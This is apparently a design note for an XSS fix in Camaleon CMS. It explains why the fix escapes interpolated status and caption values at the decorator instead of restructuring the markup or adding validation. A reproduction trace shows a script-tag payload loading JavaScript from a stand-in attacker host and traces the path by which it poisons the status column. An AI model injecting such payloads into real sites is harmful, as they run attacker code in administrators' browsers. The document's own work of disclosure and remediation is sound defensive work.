## Context

Camaleon escapes user data at the **source** — inside the decorator — rather than at the view sink. `PostDecorator#the_title` and `TermTaxonomyDecorator#the_title` both return `h.h(...)`, an already-escaped `SafeBuffer`.

That choice is deliberate and load-bearing. Most themes and plugins live in separate gems (`README.md` lists the known ones, and more exist), and many render titles through `raw`. Escaping at the source is what makes those unseeable sinks safe. Any fix here must preserve it.

```
   source                       transport                    sink
   ──────                       ─────────                    ────
   the_title  = h.h(name)  ──▶  SafeBuffer  ──────────────▶  raw(...)      safe ✔
                                                             <%= ... %>    safe ✔

   the_status = "<span …>#{status.titleize}</span>"     ──▶  raw(...)      EXECUTES ✘
   get_caption = "… <b>(#{menu.name})</b>"              ──▶  raw(...)      EXECUTES ✘
                 ▲
                 └── plain String built outside a view; nothing escapes the interpolated value
```

Both defects are the same gap: a fragment assembled outside a view, handed to a sink that trusts it.

## Decisions

### D1. Escape the interpolated value; do not restructure the markup

`the_status` could be rewritten as `h.content_tag(:span, status.titleize, class: "label label-#{color} label-form")`. That is the idiomatic Rails form and it is what `0ddf2aef` did elsewhere. **Rejected here.**

`content_tag` emits `class="…"` where the hand-built string emits `class='…'`. For every legitimate status the current output is a fixed, known byte string, and downstream themes have had years to depend on it — a theme doing `the_status.gsub("<span class='label", …)` breaks silently, and this repo cannot see those themes.

Escaping only the interpolated value keeps the output byte-identical for all five canonical statuses and differs only for a poisoned one, which is the entire point of the change. The same reasoning applies to `get_caption`, whose `<b>` wrappers are part of a rendered label that downstream code may match on.

Return a `SafeBuffer` so the value survives an escaping sink as well as a `raw` one. Every existing caller shape is compatible:

| Caller shape | Before | After |
|---|---|---|
| `raw(the_status)` (3 in-repo sinks) | works | works — `raw` on a SafeBuffer is a no-op |
| `<%= the_status %>` | renders escaped tags (already wrong) | renders correctly |
| `the_status.html_safe` (`form.html.erb:12`) | works | works — returns self |
| `"#{the_status}"` then `raw` | works | works |
| `.gsub` / `.include?` / `.match` in a theme | works | works — `SafeBuffer < String` |

### D2. No `inclusion:` validation on `Post#status` — it does not work

The obvious source-side hardening is `validates :status, inclusion: { in: %w[published pending draft draft_child trash] }`. It was reproduced and **rejected on evidence**.

**It does not close the hole.** `set_options(params[:options])` ([metas.rb:112](../../../app/models/concerns/camaleon_cms/metas.rb)) iterates the submitted hash with no key allowlist, so `options[:status_default]` is directly attacker-settable at post create and update. `PostsController#restore` then writes it with `update_column`, which skips validations and callbacks:

```ruby
@post.update_column(:status, @post.options[:status_default] || 'pending')   # posts_controller.rb:166
```

Reproduced end-to-end:

```
--- after create ---   status: "pending"   options[:status_default]: "<script src=//evil.example/a.js></script>"
--- after trash ---    status: "trash"
--- after update ---   status: "trash"     options[:status_default]: "<script src=…></script>"
--- after restore ---  status: "<script src=//evil.example/a.js></script>"   ← payload in the column
```

`DraftsController` is a third writer that bypasses validation, via `save(validate: false)`.

**And it breaks existing installs.** A validation on an existing column retroactively invalidates stored rows: any install holding a non-canonical status starts failing on the next `save` of that post — including saves triggered incidentally, such as reordering. The `else` arm of `the_status` and the `status_default` option both exist precisely to carry non-canonical statuses, so such rows are anticipated, not hypothetical.

Fixing the sink closes the vulnerability regardless of which of the three writers poisoned the column. That is the property worth having.

If source-side hardening is wanted later, the non-breaking form is an allowlist on the **incoming param** in `PostsController#get_post_data`, which touches no stored row. It is not part of this change, because it is not what fixes the bug.

### D3. `TermTaxonomyDecorator#the_status` is in scope despite not being exploitable

It builds markup the same way and reaches the same `raw` sink at `admin/search.html.erb:55`, but interpolates only I18n strings — no user data, no defect today. Included because the pattern, not the payload, is what regressed twice; leaving one instance behind is how the third regression happens.

This is scope discipline, not scope creep: the boundary is "fragments reaching these three sinks", and it is drawn in the proposal's out-of-scope list.

## Risks

- **Downstream string surgery.** Mitigated by D1 — output is byte-identical for all legitimate data. A theme matching on the *escaped* form of an injected status would change behaviour, which is the fix working.
- **Double-escaping.** `SafeBuffer` interpolated into a plain String loses its flag and is escaped again by an ERB sink. This is a real defect elsewhere in the admin panel and is fixed by `fix-admin-title-double-escaping`. It does not arise for `the_status` or `get_caption`: all in-repo callers pass them straight to a sink.
- **Non-canonical statuses already stored.** They now render as visible escaped text instead of executing. That is intended, and it is how an operator discovers a poisoned row.
